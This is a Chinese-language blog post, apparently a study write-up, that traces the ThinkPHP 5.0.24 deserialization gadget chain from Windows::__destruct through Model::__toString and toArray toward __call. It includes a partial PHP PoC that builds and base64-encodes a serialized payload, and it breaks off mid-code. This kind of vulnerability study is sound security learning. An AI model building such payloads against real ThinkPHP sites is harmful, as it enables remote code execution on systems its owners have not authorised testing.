        <content type="html"><![CDATA[<h1 id="理解在此前公开的反序列化链"><a href="#理解在此前公开的反序列化链" class="headerlink" title="理解在此前公开的反序列化链"></a>理解在此前公开的反序列化链</h1><p>不仅仅是学pop链，更是学习框架调试</p><h2 id="5-0-24反序列化漏洞分析"><a href="#5-0-24反序列化漏洞分析" class="headerlink" title="5.0.24反序列化漏洞分析"></a>5.0.24反序列化漏洞分析</h2><blockquote><p>开发人员在写程序时会极力的避免安全问题的发生，所以CTF中通过一个Class文件来进行反序列化的操作几乎时不可能存在的</p><p>实际开发在类中很少用到魔术方法等“危险函数”，但我学完这道题后有了一个体悟——“危险函数”,凑一凑总会有的</p></blockquote><p>提到的wp地址:<code>https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</code></p><h2 id="thinkphp5-0-24魔术方法及位置"><a href="#thinkphp5-0-24魔术方法及位置" class="headerlink" title="thinkphp5.0.24魔术方法及位置"></a>thinkphp5.0.24魔术方法及位置</h2><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><blockquote><p>析构函数只在对象被垃圾收集器收集前（从内存中删除之前）才会被自动调用。</p><p>可以理解为对象用完之前调用</p></blockquote><p><img src="image-20211003213508732.png" alt="image-20211003213508732"></p><p>一共有这些</p><p>按现有的wp，反序列化链子用了<code>thinkphp\library\think\process\pipes\Windows.php</code>下的<code>__destruct()</code></p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><blockquote><p>调用的方法不存在时会自动调用，程序会继续执行下去。</p></blockquote><p><img src="image-20211003213836859.png" alt="image-20211003213836859"></p><p><code>__call()</code>比较多，按wp选择Output.php，<code>thinkphp\library\think\console\Output.php</code>因为其中的block可以当作跳板</p><p>最终执行的是Request中的<code>__call()</code></p><p><img src="image-20211003214202350.png" alt="image-20211003214202350"></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote><p>格式化输出这个对象所包含的数据,当对象被当作字符串执行时使用</p></blockquote><p><img src="image-20211003215658427.png" alt="image-20211003215658427"></p><p><code>__toString()</code>也不多，wp中使用了Model类，<code>thinkphp\library\think\Model.php</code></p><p><strong>至此wp中提到的魔术方法位置全部分析完毕，接着直接分析思路</strong></p><h2 id="thinkphp5-0-24反序列化链分析"><a href="#thinkphp5-0-24反序列化链分析" class="headerlink" title="thinkphp5.0.24反序列化链分析"></a>thinkphp5.0.24反序列化链分析</h2><h3 id="跟进-destruct"><a href="#跟进-destruct" class="headerlink" title="跟进 __destruct()"></a>跟进 __destruct()</h3><p>按wp的思路，首先跟进<code>__destruct()</code>,<code>thinkphp\library\think\process\pipes\Windows.php</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 关闭</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 指向removeFiles方法</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="removeFiles"><a href="#removeFiles" class="headerlink" title="removeFiles()"></a>removeFiles()</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">/** * 删除临时文件 */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 遍历files数组</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 判断文件是否存在</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 关闭文件连接-删除文件</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 清空 files数组</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中file_exists()函数可以调用<code>__toString()</code>方法，所以下一步要看看那个<code>__toString()</code>方法可以调用</p><h3 id="toString"><a href="#toString" class="headerlink" title="__toString()"></a>__toString()</h3><p>这一步我卡了好久，一直没有明白是怎么调进<code>thinkphp\library\think\Model.php</code>的<code>__toString()</code></p><p>直到我看了poc</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜索Pivot() ,找到<code>thinkphp\library\think\model\Pivot.php</code></p><p><img src="image-20211004195037451.png" alt="image-20211004195037451"></p><p>Pivot类继承了Model类，所以只要将文件名设为Pivot的实例对象，框架就会调用进Model中的<code>__toString()</code></p><h3 id="toJson"><a href="#toJson" class="headerlink" title="toJson()"></a>toJson()</h3><p><img src="image-20211004195253706.png" alt="image-20211004195253706"></p><p>接下来<code>__toString()</code>指向了toJson()方法，继续跟进</p><p><img src="image-20211004195431444.png" alt="image-20211004195431444"></p><p>到这里为止poc可以这样写</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// Windows对此进行了继承，所以需要写一下</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*Pivot类继承了Model类，所以files引用Pivot实例会跳转Model类的toString*/</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用至Model类</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出exp</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211009210524614.png" alt="image-20211009210524614"></p><p>成功调用到toArray()方法</p><h3 id="toArray"><a href="#toArray" class="headerlink" title="toArray()"></a>toArray()</h3><p>接着继续跟进toArray()</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$item</span>    <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$hidden</span>  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 合并data数组和relation数组</span>        <span class="token comment" spellcheck="true">// 过滤属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseAttr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span><span class="token punctuation">,</span> <span class="token variable">$visible</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$data</span>  <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 使用键名比较计算数组的交集</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hidden</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseAttr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hidden</span><span class="token punctuation">,</span> <span class="token variable">$hidden</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$data</span>  <span class="token operator">=</span> <span class="token function">array_diff_key</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 交換數組鍵和值后用建比較數組的差集</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$val</span> <span class="token keyword">instanceof</span> <span class="token class-name">Model</span> <span class="token operator">||</span> <span class="token variable">$val</span> <span class="token keyword">instanceof</span> <span class="token class-name">ModelCollection</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 关联模型对象</span>                <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">subToArray</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$visible</span><span class="token punctuation">,</span> <span class="token variable">$hidden</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">Model</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 关联模型数据集</span>                <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$val</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">subToArray</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$visible</span><span class="token punctuation">,</span> <span class="token variable">$hidden</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 模型属性</span>                <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 追加属性（必须定义获取器）</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 追加关联对象属性</span>                    <span class="token variable">$relation</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$relation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 追加关联对象属性</span>                    <span class="token variable">$relation</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$relation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$attr</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$relation</span> <span class="token operator">=</span> Loader<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token variable">$value</span>         <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bindAttr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$bindAttr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$attr</span> <span class="token punctuation">:</span> <span class="token variable">$key</span><span class="token punctuation">;</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'bind attr has exists:'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span> <span class="token operator">?</span> <span class="token variable">$value</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">continue</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$item</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码很多，这里我也没什么号的思路，wp是以目标来进行倒推</p><p>因为最终的目标是<code>__call()</code>，所以需要去找存在函数调用的点，并寻找那个调用可控</p><p>可以找到三个发生了方法调用的点</p><p><img src="image-20211004210222133.png" alt="image-20211004210222133"></p><p>追踪过去，发现只有第三个可控</p><p><img src="image-20211004210313870.png" alt="image-20211004210313870"></p><p><img src="image-20211004210327337.png" alt="image-20211004210327337"></p><p>调用条件可以根据代码得知</p><pre class="line-numbers language-php"><code class="language-php">需要满足的条件是<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bindAttr</span><span class="token punctuation">)</span>且不满足<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后分析$value的执行过程</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 定义数组append</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 遍历，获取值为$name</span><span class="token variable">$relation</span> <span class="token operator">=</span> Loader<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解析name</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 判断$relation方法是否存在</span><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用该方法</span><span class="token variable">$value</span>      <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取$value</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token 